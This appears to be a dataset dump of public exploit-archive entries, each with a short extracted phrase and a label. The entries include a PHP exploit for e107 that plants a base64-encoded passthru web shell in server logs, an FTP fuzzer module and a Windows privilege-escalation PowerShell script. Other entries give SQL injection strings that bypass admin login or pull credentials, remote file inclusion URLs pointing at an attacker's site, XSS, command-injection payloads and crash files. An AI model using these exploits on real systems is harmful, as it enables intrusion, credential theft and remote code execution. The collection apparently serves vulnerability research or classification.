datastore['EXTRALINE']         extra = ""\r\n""       else         extra = """"       end       dirlist = ""drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{strfolder}\r\n"" + extra       dirlist << ""-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{strfile}\r\n"" + extra       conn.put(""total 2\r\n""+dirlist)       conn.close       return      when 'RETR'         conn = establish_data_connection(c)       if(not conn)         c.put(""425 Can't build data connection\r\n"")         return       end       print_status("" - Data connection set up"")       strcontent = ""blahblahblah""       dofuzz = fuzz_this_cmd(""LIST"")       if (dofuzz==1)         strcontent = @fuzzdata         paylen = @fuzzdata.length          incr_fuzzsize()       end       c.put(""150 Opening BINARY mode data connection #{strcontent}\r\n"")       print_status("" - Sending data via data connection"")       conn.put(strcontent)       c.put(""226 Transfer complete\r\n"")       conn.close       return      when /^(STOR|MKD|REM|DEL|RMD)$/       send_response(c,arg,cmd.upcase,500,"" Access denied"")       return      when 'FEAT'       send_response(c,arg,""FEAT"","""",""211-Features:\r\n211 End"")       return      when 'HELP'       send_response(c,arg,""HELP"",214,"" Syntax: #{arg} - (#{arg}-specific commands)"")      when 'SITE'       send_response(c,arg,""SITE"",200,"" OK"")       return      when 'NOOP'       send_response(c,arg,""NOOP"",200,"" OK"")       return      when 'ABOR'       send_response(c,arg,""ABOR"",225,"" Abor command successful"")       return      when 'ACCT'       send_response(c,arg,""ACCT"",200,"" OK"")       return      when 'RNFR'       send_response(c,arg,""RNRF"",350,"" File exists"")       return      when 'RNTO'       send_response(c,arg,""RNTO"",350,"" File exists"")       return     else       send_response(c,arg,cmd.upcase,200,"" Command not understood"")       return     end     return   end       def fuzz_this_cmd(cmd)     @fuzzcommands = datastore['FUZZCMDS'].split("","")     fuzzme = 0     @fuzzcommands.each do |thiscmd|       if ((cmd.upcase == thiscmd.upcase) || (thiscmd==""*"")) && (fuzzme==0)         fuzzme = 1       end     end     if fuzzme==1        if datastore['CYCLIC']         @fuzzdata = Rex::Text.pattern_create(@fuzzsize)       else         @fuzzdata = ""A"" * @fuzzsize       end     end     return fuzzme   end    def incr_fuzzsize     @stepsize = datastore['STEPSIZE'].to_i     @fuzzsize = @fuzzsize + @stepsize      if (@fuzzsize > datastore['ENDSIZE'].to_i)       @fuzzsize = datastore['ENDSIZE'].to_i     end   end      def send_response(c,arg,cmd,code,msg)     if arg.length > 40       showarg = arg[0,40] + ""...""     else       showarg = arg     end     if cmd.length > 40       showcmd = cmd[0,40] + ""...""     else       showcmd = cmd     end      dofuzz = fuzz_this_cmd(cmd)      if (dofuzz==1) && (cmd.upcase != ""PASV"")       paylen = @fuzzdata.length        if datastore['ERROR']         code = ""550 ""       end       if cmd==""FEAT""         @fuzzdata = ""211-Features:\r\n ""+@fuzzdata+""\r\n211 End""       end       if cmd==""PWD""         @fuzzdata = ""  \""/""+@fuzzdata+""\"" is current directory""       end       cmsg = code.to_s + "" "" + @fuzzdata       c.put(""#{cmsg}\r\n"")       print_status(""* Fuzz data sent"")       incr_fuzzsize()     else             cmsg = code.to_s + msg       cmsg = cmsg.strip       c.put(""#{cmsg}\r\n"")     end     return   end end",a specially crafted .rb file,1
2711,"e107 < 0.75 - 'e107language_e107cookie' Local File Inclusion <?  print	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -    [Exploit name: e107 <= 0.7.5 Remote Code Execution Exploit [Script name: e107 v.0.7.5 [Script site: http://e107.org/ dork: ""This site is powered by e107""    Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon  TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios,  mIvus, nukedclx, SkD, wacky, xoron -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';   /* works with register_globals=On  explaination: i find in file gsitemap.php on line 19-28:  .... require_once(""class2.php"");                             // <--------{1}  if (file_exists(e_PLUGIN.""gsitemap/languages/gsitemap_"".e_LANGUAGE."".php"")) { 	include_once(e_PLUGIN.""gsitemap/languages/gsitemap_"".e_LANGUAGE."".php""); } else { 	include_once(e_PLUGIN.""gsitemap/languages/gsitemap_English.php""); }  ....  in file class2.php on line 328-334: .... $language=(isset($_COOKIE['e107language_'.$pref['cookie_name']]) ? $_COOKIE['e107language_'.$pref['cookie_name']] : ($pref['sitelanguage'] ? $pref['sitelanguage'] : ""English""));         // <---------{2} define(""e_LAN"", $language);                            // <---------{3} define(""USERLAN"", ($user_language && (strpos(e_SELF, $PLUGINS_DIRECTORY) !== FALSE || (strpos(e_SELF, $ADMIN_DIRECTORY) === FALSE && file_exists(e_LANGUAGEDIR.$user_language.""/lan_"".e_PAGE)) || (strpos(e_SELF, $ADMIN_DIRECTORY) !== FALSE && file_exists(e_LANGUAGEDIR.$user_language.""/admin/lan_"".e_PAGE)) || file_exists(dirname($_SERVER['SCRIPT_FILENAME']).""/languages/"".$user_language.""/lan_"".e_PAGE)    || (    (strpos(e_SELF, $ADMIN_DIRECTORY) == FALSE) && (strpos(e_SELF, $PLUGINS_DIRECTORY) == FALSE) && file_exists(e_LANGUAGEDIR.$user_language.""/"".$user_language."".php"")  )   ) ? $user_language : FALSE)); define(""e_LANGUAGE"", (!USERLAN || !defined(""USERLAN"") ? $language : USERLAN));                    // <---------{4}  e107_include(e_LANGUAGEDIR.e_LANGUAGE.""/"".e_LANGUAGE."".php"");                    // <---------{5} e107_include_once(e_LANGUAGEDIR.e_LANGUAGE.""/"".e_LANGUAGE.""_custom.php""); ....  so we can use: Cookie: e107language_e107cookie=../../../../../../../../../etc/passwd%00 local include :)   by Kacper ;) */   if ($argc<9) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path username password user_id user_session date cmd OPTIONS host:      target server (ip/hostname) path:      e107 path username:  you registered login password:  you username password user_id:   you user ID user_session: user sid date:      current date, like: 307.2006 //$date = date(""z.Y"", time()); cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /e107/ Hauru enter 99 c16d9ef241904bf801c6e45693387506 307.2006 ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 / Hauru enter 99 c16d9ef241904bf801c6e45693387506 307.2006 ls -la ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacket($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $username=$argv[3]; $password=$argv[4]; $id=$argv[5]; $session=$argv[6]; $date=$argv[7]; $cmd="""";  $port=80; $proxy=""""; for ($i=8; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}   echo ""[1] insert evil code in logfiles ...\r\n\r\n""; $hauru = base64_decode(""Jzw/cGhwIG9iX2NsZWFuKCk7Ly9SdWNob215IHphbWVrIEhhdXJ1IDstKWVjaG8iLi4uSGFja2VyLi5LYWNwZXIuLk1hZGUuLmluLi5Qb2xhbmQhIS4uLkRFVklMLlRFQU0uLnRoZS4uYmVzdC4ucG9saXNoLi50ZWFtLi5HcmVldHouLi4iO2VjaG8iLi4uR28gVG8gREVWSUwgVEVBTSBJUkM6IDcyLjIwLjE4LjY6NjY2NyAjZGV2aWx0ZWFtIjtlY2hvIi4uLkRFVklMIFRFQU0gU0lURTogaHR0cDovL3d3dy5yYWhpbS53ZWJkLnBsLyI7aW5pX3NldCgibWF4X2V4ZWN1dGlvbl90aW1lIiwwKTtlY2hvICJIYXVydSI7cGFzc3RocnUoJF9TRVJWRVJbSFRUUF9IQVVSVV0pO2RpZTs/Pg==""); $packet=""GET "".$p.$hauru."" HTTP/1.0\r\n""; $packet.=""User-Agent: "".$hauru."" Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: close\r\n\r\n""; sendpacket($packet); sleep(3);  $data.='-----------------------------7d6224c08dc Content-Disposition: form-data; name=""username""  '.$username.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""userpass""  '.$password.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""userlogin""  Log In -----------------------------7d6224c08dc-- ';  echo ""login hauru in e107...\n""; $packet =""POST "".$p.""login.php HTTP/1.0\r\n""; $packet.=""User-Agent: "".$hauru.""\r\n""; $packet.=""CLIENT-IP: 999.999.999.999\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);  echo ""insert hauru in e107...\n""; $packet =""POST "".$p.""index.php?logout HTTP/1.0\r\n""; $packet.=""Cookie: e107cookie="".$id.""."".$session."";\r\n""; $packet.=""User-Agent: "".$hauru.""\r\n""; $packet.=""CLIENT-IP: 999.999.999.999\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);   echo "" now remote code execution...\n""; $packet =""GET "".$p.""gsitemap.php HTTP/1.1\r\n""; $packet.=""Cookie: e107language_e107cookie=../e107_plugins/log/logs/logi_"".$date."".php%00;\r\n""; $packet.=""HAURU: "".$cmd.""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacket($packet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); }  $paths= array ( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" );  for ($i=0; $i<=count($paths)-1; $i++) { $a=$i+2; echo ""[2] ["".$a.""] Check Path: "".$paths[$i].""\r\n""; echo ""[3] remote code execution...wait..\n""; $packet =""GET "".$p.""gsitemap.php HTTP/1.1\r\n""; $packet.=""Cookie: e107language_e107cookie=../"".$paths[$i].""%00;\r\n""; $packet.=""HAURU: "".$cmd.""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacket($packet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); } } echo ""Exploit err0r :(\r\n""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n""; ?>  # milw0rm.com [2006-11-04]",a specially crafted .pl file,1
26858,Binary Board System 0.2.5 - 'reply.pl' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/15913/info  binary board system is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  This issue affects version 0.2.5; earlier versions may also be vulnerable.   http://www.example.com/reply.pl?board=1&article=81&inreplyto=[XSS]&[member]=yes http://www.example.com/reply.pl?board=1&article=[XSS]&inreplyto=0&[member]=yes http://www.example.com/reply.pl?board=[XSS]&article=81&inreplyto=&[member]=yes,a specially crafted .pl file,1
46423,"eDirectory - SQL Injection # Exploit Title: Admin auth bypass, SQLi and File Disclosure # Google Dork: no defacers please ! # Date: March 2019 (reported to vendor without response :D) # Exploit Author: Efren Diaz # Author contact: https://twitter.com/elefr3n # Vendor Homepage: https://www.edirectory.com/ # Software Link: not available # Version: All versions # Tested on: Ubuntu 14.04 # CVE : none  #DESCRIPTION eDirectory is a software to create your own membership website, business directories, yellow pages, coupon sites, local guide, lead gen sites and more.   # SQL Injection Links:   - https://site.com/location.php?type=byId&id=[INT]&childLevel=[INT]&level=[SQLi]   - https://site.com/sitemgr/login.php?key=[SQLi]  # Administrator Login Bypass The login SQL injection can be useful for us to make a union SQL injection to avoid the administrator authentication and get access to the dashboard correctly. Sometimes you get a ""Invalid key error"", but the web application set to you correctly the cookie, if you got that error press F5 and you will be authenticated as an administrator Link: https://site.com/sitemgr/login.php?key=' union select 0,1,0,'sitemgr' -- -  # File Disclosure (authenticated) Note: only files with .php extension, but don't forget try null-byte in old php versions Links:   - https://site.com/sitemgr/langcenter/language_file.php?language_area=front&domain_id=1&language_id=[PATH]   - https://site.com/sitemgr/configuration/geography/language/language_file.php?language_area=front&domain_id=1&language_id=[PATH]",the malicious message,1
44314,"Microsoft Windows - Desktop Bridge Virtual Registry Arbitrary File Read/Write Privilege Escalation <# Windows: Windows: Desktop Bridge Virtual Registry Arbitrary File Read/Write EoP Platform: Windows 1709 (not tested earlier version) Class: Elevation of Privilege  Summary: The handling of the virtual registry for desktop bridge applications can allow an application to create arbitrary files as system resulting in EoP.  Description: The desktop bridge functionality introduced in Anniversary edition allows an application to set up a virtual registry to add changes to system hives and user hives without actually modifying the real hives. The configuration of these registry hives is by passing a data structure to the virtual registry driver in the kernel. Loading new hives requires SeRestorePrivilege so the loading of the hives is done in the AppInfo service as part of the Desktop AppX initialization process using the container/silo APIs. In order to have this privilege the registry loader must be called by an administrator, in this case the SYSTEM user.  This is a security issue because the registry hive files are stored inside the user’s profile under %LOCALAPPDATA%\Packages\PackageName\SystemAppData\Helium. It’s possible to replace the directories with mount points/symlinks to redirect file access. This can be used to load arbitrary registry hives including ones not accessible normally by a user, but the most serious consequence of this is if a registry hive is opened for write access the kernel will try and create a couple of log files in the same directory if they don’t already exist. If you redirect the creation of these files to another location using symlinks you can create arbitrary files on disk.   This also applies to the main hive file as well, but the advantage of the log files is the kernel will create them with the same security descriptor as the main hive which means they can be accessed by the normal user afterwards. The known writable hive files which can be abused in this way are:  User.dat UserClasses.data Cache\XXXX_COM15.dat  Again we can use the Get/My Office application installed by default. Note that you only need a valid Desktop Bridge application, you don’t need one which actually has a registry.dat file installed as the user hives and com15 hives seem to be created regardless.  This issue is due to a fundamental problem in the implementation of the hive loading APIs, it's dangerous to load hives from a user accessible location as it must be done as an admin to have the required privilege. I've reported similar issues before. Considering the virtual registry driver is the one loading the hive perhaps you could pass a token handle to the driver which the kernel will impersonate during loading, after it's verified the SeRestorePrivilege from the current caller.  NOTE: Please don’t ignore the fact that this can also be used to load arbitrary registry hives that the user normally can’t access, as long the hive is accessible by SYSTEM. I’ve only sent the one issue but you should also ensure that any fix also takes into account the read issue as well.  Proof of Concept:  I’ve provided a PoC as a PowerShell script. You need to install my NtObjectManager module from PSGallery first (using Install-Module NtObjectManager). In order for the exploit to work you need a copy of the Get Office/My Office application installed (I tested with version 17.8830.7600.0).  The exploit works as follows: * The Helium\Cache folder is renamed to Cache-X. * The Cache folder is recreated as a mount point which redirects to the object manager directory \RPC Control * Symbolic links are dropped for the registry hive files. The LOG files are redirected to an arbitrary name in the windows folder.  1) Install the NtObjectManager module and set execution policy for PS to Bypass. 2) Start the Get/My Office application once to ensure the user directories and registry hives have been created. 3) Start the poc in powershell, it should print it’s waiting for you to start the Office Hub application. 4) Start the Get/My Office application, it should be immediately killed.  Note that the PoC will leave the user profile for the Office Hub application broken, you should delete the fake Cache folder and rename the Cache-X folder to try the exploit again.  Expected Result: The application creation fails or at least the symbolic links aren’t followed.  Observed Result: Two new files are created in the c:\windows folder with potentially arbitrary names which are also writable by a normal user. #>  $ErrorActionPreference = ""Stop""  Import-Module NtObjectManager  function Test-WritablePath {     Param($Path)     if (Test-Path $Path) {         Use-NtObject($file = Get-NtFile ""$Path"" -Win32Path) {             return ($file.GrantedAccess -band ""WriteData"") -eq ""WriteData""         }     }     return $false }  $path = ""$env:USERPROFILE\appdata\local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\Cache"" $newpath = ""$path-X"" $path = Resolve-Path $path $files = Get-ChildItem ""$path\*.dat"" $linkpath = ""\RPC Control""  Rename-Item $path $newpath  [NtApiDotNet.NtFile]::CreateMountPoint(""\??\$path"", $linkpath, """")  Use-NtObject($list = [NtApiDotNet.DisposableList[NtApiDotNet.NtSymbolicLink]]::new()) {      foreach($file in $files) {         $name = $file.Name          $link = New-NtSymbolicLink ""$linkpath\$name"" ""\??\$newpath\$name""         $list.Add($link) | Out-Null         $link = New-NtSymbolicLink ""$linkpath\$name.LOG1"" ""\??\$env:windir\badger.$name.LOG1""         $list.Add($link) | Out-Null         $link = New-NtSymbolicLink ""$linkpath\$name.LOG2"" ""\??\$env:windir\badger.$name.LOG2""         $list.Add($link) | Out-Null     }      Write-Host ""Created links, now start Office Hub to complete""          while($true) {         Use-NtObject($procs = Get-NtProcess -Name ""OfficeHubWin32.exe"") {             if ($null -ne $procs) {                 Write-Host ""Found Process""                 $procs.Terminate(0)                 $procs.Wait()                 # Just wait a bit to ensure files released.                 Start-Sleep -Seconds 5                 break             }         }         Start-Sleep -Seconds 1          }      foreach($file in $files) {         $name = $file.Name         $test_path = ""$env:windir\badger.$name.LOG1""         if (Test-WritablePath $test_path) {             Write-Host ""Found writable file $test_path""         }         $test_path = ""$env:windir\badger.$name.LOG2""         if (Test-WritablePath $test_path) {             Write-Host ""Found writable file $test_path""         }     } }",passing a data structure to the virtual registry driver in the kernel,1
23520,PHPGedView 2.61 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/9368/info  PhpGedView is prone to multiple file include vulnerabilities. The source of the issue is that a number of scripts that ship with the software permit remote users to influence require() paths for various external files. This will permit remote attackers to cause malicious PHP scripts from attacker-controlled servers to be included and subsequently executed in the context of the web server hosting the vulnerable software.  These issues are reported to affect PhpGedView 2.61. Other versions are also likely affected.  http://www.example.com/phpgedview_folder/authentication_index.php?PGV_BASE_DIRECTORY=http://[attacker's_site] http://www.example.com/phpgedview_folder/functions.php?PGV_BASE_DIRECTORY=http://[attacker's_site] http://www.example.com/phpgedview_folder/config_gedcom.php?PGV_BASE_DIRECTORY=http://[attacker's_site],a number of scripts that ship with the software permit remote users to influence require() paths for various external files,1
28197,"Microsoft Internet Explorer 6 - Object.Microsoft.DXTFilter Denial of Service source: https://www.securityfocus.com/bid/18903/info  Microsoft Internet Explorer is prone to a denial-of-service vulnerability.  This issue is triggered when an attacker convinces a victim user to visit a malicious website.  Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.  // MoBB Demonstration function Demo() { 	var a = new ActiveXObject(""Object.Microsoft.DXTFilter""); 	a.Enabled = 1; }  </script>  Clicking the button below may crash your browser!<br><br> <input type='button' onClick='Demo()' value='Start Demo!'>",convinces a victim user to visit a malicious website,1
30379,"Webbler CMS 3.1.3 - Mail A Friend Open Email Relay source: https://www.securityfocus.com/bid/25045/info  The 'webbler' is prone to an open-email-relay vulnerability.  An attacker may leverage the issue to use webservers that are hosting the vulnerable software to send arbitrary unsolicited bulk email. Attackers may also forge email messages that originate from trusted mail servers.  This issue affects webbler 3.1.3; prior versions may also be affected.    <form method=""post"" action=""http://www.target-domain.com/?lid=12506"">         <input type=""hidden"" name=""code"" value=""4672577a2d323"">         <input type=""hidden"" name=""referral_uri"" value="""">         <input type=""hidden"" name=""document_title"" value="""">         <input type=""text"" name=""recipient"" value="""">         <input type=""text"" name=""username"" value="""">         <input type=""text"" name=""useremail"" value="""">         <INPUT class=""sendbutton"" type=submit name=sa VALUE=""send page"">         </form>",use webservers that are hosting the vulnerable software,1
35592,"jetAudio 8.1.3 Basic (mp3) - Crash (PoC) # Exploit Title     	: jetAudio 8.1.3 Basic (Corrupted mp3) Crash POC # Product				: jetAudio Basic # Date              	: 8.12.2014 # Exploit Author    	: ITDefensor Vulnerability Research Team http://itdefensor.ru/ # Software Link     	: http://www.jetaudio.com/download/ # Vulnerable version	: 8.1.3 (Latest at the moment) and probably previous versions # Vendor Homepage   	: http://www.jetaudio.com/ # Tested on         	: jetAudio 8.1.3 Basic installed on Windows 7 x64, Windows Server 2008, Windows 7 x86 # CVE 					: unknown at the moment #============================================================================================ # Open created POC file (fault.mp3) with jetAudio # Details # 	(1e764.1df98): Access violation - code c0000005 (first chance) #	First chance exceptions are reported before any exception handling. #	This exception may be expected and handled. #	jdl_id3lib!dami::io::BStringWriter::writeChars+0xbf9: #	0aa6b8b9 8b4804          mov     ecx,dword ptr [eax+4] ds:002b:00000004=???????? #	0:000:x86> kb #	ChildEBP RetAddr  Args to Child               #	WARNING: Stack unwind information not available. Following frames may be wrong. #	00000000 00000000 00000000 00000000 00000000 jdl_id3lib!dami::io::BStringWriter::writeChars+0xbf9 #============================================================================================ #!/usr/bin/python    pocdata=(""\x49\x44\x33\x00\x00\xC9\x00\x00\x00\x00\x41\x45\x4E\x43\x00\x00\x00\x00\x00\x00\x41\x45\x4E\x43\x00\x00\x00\x00\x00\x00\x41\x45\x4E\x43\x00\x00\x00\x00\x00\x00\x41\x45\x4E\x43\x00\x00\x00\x00\x00\x00\x41\x45\x4E\x43\x00\x00\x00\x00\x00\x00\xFF\x8E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x41\x47\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"")    mp3file = ""fault.mp3"" file = open(mp3file , ""w"") file.write(pocdata) file.close()",a specially crafted .mp3 file,1
1807,"Zix Forum 1.12 - 'layid' SQL Injection Zix Forum <= 1.12 (layid) SQL Injection Vulnerability   Vulnerability: -------------------- SQL_Injection: Input passed to the ""layid"" parameter in 'settings.asp' not properly sanitised before being used in a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. Successful exploitation extracts username and password of administrator in clear text .   Proof of Concepts: -------------------- site.com/zix/login.asp?layid=-1%20union%20select%201,null,null,1,1,1,1,null,1,1,J_User,null,1,1,1,1,1,J_Pass,null,null,null,null,1,1,1,1,1,1,1,1,1,1,1,1,1,1,null%20from%20adminLogins where approve=1 and '1'='1' site.com/zix/main.asp?layid=-1%20union%20select%201,null,null,null,1,1,1,null,1,1,J_User,null,1,1,1,1,1,J_Pass,null,null,null,null,1,1,1,1,1,1,1,1,1,1,1,1,1,null,null%20from%20adminLogins where approve=1 and '1'='1'  -------  By FarhadKey On 19 May 2006  # milw0rm.com [2006-05-19]",injecting arbitrary SQL code,1
38699,"CF Image Host 1.65 - PHP Command Injection [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/AS-CFIMAGEHOST-PHP-CMD-INJECTION.txt   Vendor: ==================================== codefuture.co.uk/projects/imagehost   Product: =================================== CF Image Host 1.65 - 1.6.6  Archive download listed as: version 1.65 unzips as imagehost 1.6.6   Vulnerability Type: ===================== PHP Command Injection   CVE Reference: ============== N/A   Vulnerability Details: =====================  CF Imagehost allows users who have access to the management area the ability to write directly to the 'set.php' page under the /inc directory that stores setting values for the 'Site Title', 'Site Slogan' etc, this allows a local attacker ability to inject specially crafted PHP command payloads to execute arbitrary operating system commands on the victim host. Possibly leading to privilege escalation, RFI, backdoors etc.. and most likely full compromise of the affected system or shared environment if applicable.   PHP Command Injection Exploit code(s): =====================================  Under the setting tab we can inject following below PHP code and it will remain persistent as it is written disk in 'set.php', afterwards when the victim visits the application and click a tab the persistent OS command will be executed.   1) navigate to CF image host settings tab http://localhost/imagehost1.6.6/admin.php?act=set 2) click on admin menu on left and enter your passwords DO NOT click 'Save changes' yet! or you get error message to enter creds 3) now go back to settings tab and click 'General' then inject below PHP code into the 'Site Title' input field 4) now click 'Save Changes', this code will get stored under  /inc directory within the 'set.php' PHP file.  our PHP injection payload needs the single quotes, double back slashes, semicolons as described below to correctly escape the syntax so we do not break the PHP page and cause errors, our extra \\ quoutes and ; gets removed after injection takes place.  some examples...   ';echo exec(""c:\\Windows\\system32\\calc.exe"");'';';  'set.php' on line 11 then becomes: $settings['SET_TITLE'] = '';echo exec(""c:\Windows\system32\calc.exe"");'';';';  OR inject CMD to launch chrome.exe etc...  ';echo exec(""c:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"");'';';   After, click on some tabs above like 'Database' or 'Ban User' and Tada! this will execute our stored PHP command... either running calc.exe or launching Google Chrome.    Disclosure Timeline: ===================== Vendor Notification:  NA November 13, 2015  : Public Disclosure   Exploitation Technique: ======================= Local / Remote   Severity Level: ================ High   Description: ================================================================  Request Method(s):            [+] POST   Vulnerable Product:           [+] CF Image Host 1.65 - 1.6.6   Vulnerable Parameter(s):      [+] 'Site Title', 'Site Slogan' etc..   Affected Area(s):             [+]  OS    [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in 